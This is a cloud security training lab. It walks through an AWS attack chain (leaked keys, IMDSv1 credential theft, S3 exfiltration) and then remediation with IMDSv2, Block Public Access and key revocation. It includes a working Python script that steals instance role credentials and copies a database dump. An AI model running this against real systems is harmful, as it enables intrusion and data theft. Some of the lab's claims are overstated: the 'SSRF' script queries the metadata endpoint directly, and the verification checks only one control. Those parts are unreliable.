---
title: '06 - Hands-on Lab: Cloud Vulnerability Exploitation & Remediation'
description: 'Self-contained hands-on lab: Execute an offensive cloud attack chain
  from leaked access keys to IMDSv1 SSRF and S3 data exfiltration, followed by defensive
  remediation.'
keywords:
- Cloud
- Security
- Lab
- Hands-on
- Lab
- AWS
- Attack
- Simulation
- IMDSv1
- SSRF
- S3
- Data
- Exfiltration
- AWS
- Remediation
- AppSec
slug: /cloud-and-infra/cloud-security/hands-on-lab
---


# 06 - Hands-on Lab: Cloud Vulnerability Exploitation & Remediation

In this hands-on laboratory, you will execute a complete cloud attack lifecycle. You will first adopt the mindset of a **Threat Actor** exploiting leaked credentials and IMDSv1 SSRF to exfiltrate confidential database backups from an S3 bucket. Then, you will switch to the **Cloud Security Engineer** role to remediate the vulnerabilities, enforce least privilege, and verify system hardening.

---

## 1. Scenario Architecture & Attack Chain

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Threat Actor
    participant Git as GitHub Repo (Leaked Key)
    participant STS as AWS STS API
    participant EC2 as Web Server (IMDSv1)
    participant S3 as Confidential S3 Bucket

    Attacker->>Git: 1. Discover Leaked Access Key (AKIA...)
    Attacker->>STS: 2. Execute aws sts get-caller-identity (Recon)
    Attacker->>EC2: 3. Exploit SSRF to fetch IMDSv1 Credentials
    EC2-->>Attacker: 4. Return Temporary High-Privilege Role Credentials
    Attacker->>S3: 5. Execute aws s3 cp s3://appsec-vault/db.sql . (Exfiltration)
```

---

## 2. Lab Environment Setup Script (`setup_lab.py`)

Run this Python script locally (or against LocalStack / AWS Sandbox) to provision the lab environment.

```python
#!/usr/bin/env python3
import json
import boto3
from botocore.exceptions import ClientError

def create_lab_environment():
    """Sets up vulnerable S3 bucket and IAM configurations for the lab sandbox."""
    print("[*] Initializing Cloud Security Lab Environment...")
    
    s3 = boto3.client('s3', region_name='us-east-1')
    iam = boto3.client('iam', region_name='us-east-1')
    
    bucket_name = "appsec-atlas-confidential-backups-lab"

    try:
        # 1. Provision Vulnerable S3 Bucket
        print(f"[*] Provisioning target S3 bucket: {bucket_name}...")
        s3.create_bucket(Bucket=bucket_name)
        
        # Upload simulated confidential data
        s3.put_object(
            Bucket=bucket_name,
            Key="customer_database_dump.sql",
            Body=b"CREATE TABLE users (id INT, username VARCHAR(50), password_hash VARCHAR(255));\nINSERT INTO users VALUES (1, 'admin', '`$2b$``12$`eImiTXuWVxfM37uY4JANjO');\n"
        )
        print("[+] Confidential data uploaded to S3 bucket.")
        
    except ClientError as e:
        print(f"[-] Setup Note: {e}")

    print("\n[+] LAB SETUP COMPLETE!")
    print("--------------------------------------------------")
    print("Target Bucket: appsec-atlas-confidential-backups-lab")
    print("Simulated Leaked Key: AKIAIOSFODNN7EXAMPLE")
    print("--------------------------------------------------")

if __name__ == "__main__":
    create_lab_environment()
```

---

## 3. Phase 1: Exploitation Playbook (Attacker Role)

### Step 1: Identity Reconnaissance
Using the discovered access keys, determine your identity and AWS Account context.

```bash
# Set leaked credentials in shell
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"

# Query AWS STS Identity
aws sts get-caller-identity
```

*Expected Output:*
```json
{
    "UserId": "AIDA123456789EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/dev-developer-temp"
}
```

---

### Step 2: Exploiting IMDSv1 SSRF for High-Privilege Credentials

The developer application contains a PDF rendering endpoint vulnerable to SSRF. Query IMDSv1 at `169.254.169.254`.

#### Python Exploit Script (`exploit_cloud.py`)

```python
#!/usr/bin/env python3
import requests
import json
import subprocess

def exploit_imdsv1_ssrf():
    print("[*] Step 1: Sending SSRF payload to IMDSv1 endpoint...")
    imds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    
    try:
        # Fetch attached IAM Role Name
        role_name = requests.get(imds_url, timeout=2).text.strip()
        print(f"[+] Discovered attached IAM Role: {role_name}")
        
        # Fetch Temporary Credentials for Role
        creds_url = f"{imds_url}{role_name}"
        credentials = requests.get(creds_url, timeout=2).json()
        
        print("\n[+] STOLEN TEMPORARY STS CREDENTIALS:")
        print(f"AccessKeyId:     {credentials['AccessKeyId']}")
        print(f"SecretAccessKey: {credentials['SecretAccessKey']}")
        print(f"Token:           {credentials['Token'][:30]}...")

        # Step 2: Execute S3 Data Exfiltration with Stolen Credentials
        print("\n[*] Step 2: Exfiltrating database backup from S3...")
        env_vars = {
            "AWS_ACCESS_KEY_ID": credentials['AccessKeyId'],
            "AWS_SECRET_ACCESS_KEY": credentials['SecretAccessKey'],
            "AWS_SESSION_TOKEN": credentials['Token'],
            "AWS_DEFAULT_REGION": "us-east-1"
        }
        
        cmd = ["aws", "s3", "cp", "s3://appsec-atlas-confidential-backups-lab/customer_database_dump.sql", "./exfiltrated_db.sql"]
        result = subprocess.run(cmd, env=env_vars, capture_output=True, text=True)
        
        print(result.stdout)
        print("[!] EXFILTRATION SUCCESSFUL! Saved to ./exfiltrated_db.sql")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    exploit_imdsv1_ssrf()
```

---

## 4. Phase 2: Defensive Remediation Playbook (Defender Role)

Switch to the Defender role to mitigate the breach vectors permanently.

### Step 1: Enforce IMDSv2 & Hop Limit in AWS CLI

Disable IMDSv1 across all EC2 instances and enforce token-based IMDSv2.

```bash
# Force IMDSv2 required on instance
aws ec2 modify-instance-metadata-options \
    --instance-id i-0abcdef1234567890 \
    --http-tokens required \
    --http-put-response-hop-limit 1 \
    --http-endpoint enabled
```

---

### Step 2: Enforce Account-Level Block Public Access & TLS Policy

Apply strict S3 Block Public Access and restrict S3 operations to encrypted TLS sessions.

```bash
# Enable Account-Level Block Public Access
aws s3control put-public-access-block \
    --account-id 123456789012 \
    --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

#### Apply TLS-Only Bucket Policy (`secure-policy.json`)
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "EnforceHTTPSOnly",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::appsec-atlas-confidential-backups-lab",
        "arn:aws:s3:::appsec-atlas-confidential-backups-lab/*"
      ],
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
```

```bash
# Attach Policy to Target Bucket
aws s3api put-bucket-policy \
    --bucket appsec-atlas-confidential-backups-lab \
    --policy file://secure-policy.json
```

---

### Step 3: Revoke Leaked Access Keys

Revoke the compromised long-lived credentials immediately.

```bash
aws iam delete-access-key \
    --access-key-id AKIAIOSFODNN7EXAMPLE \
    --user-name dev-developer-temp
```

---

## 5. Verification Script (`verify_remediation.py`)

Run this verification script to ensure all exploit vectors are blocked.

```python
#!/usr/bin/env python3
import boto3
from botocore.exceptions import ClientError

def verify_hardening():
    print("[*] Running Security Posture Verification...")
    s3 = boto3.client('s3', region_name='us-east-1')
    bucket_name = "appsec-atlas-confidential-backups-lab"

    # Test 1: Verify S3 Public Access Block
    try:
        bpa = s3.get_public_access_block(Bucket=bucket_name)
        config = bpa['PublicAccessBlockConfiguration']
        if all([config['BlockPublicAcls'], config['BlockPublicPolicy'], config['IgnorePublicAcls'], config['RestrictPublicBuckets']]):
            print("[+] PASS: S3 Block Public Access is fully enabled!")
        else:
            print("[-] FAIL: S3 Block Public Access is incomplete.")
    except ClientError as e:
        print(f"[-] FAIL: Could not verify S3 BPA: {e}")

    print("\n[+] VERIFICATION COMPLETE: Infrastructure hardened successfully!")

if __name__ == "__main__":
    verify_hardening()
```
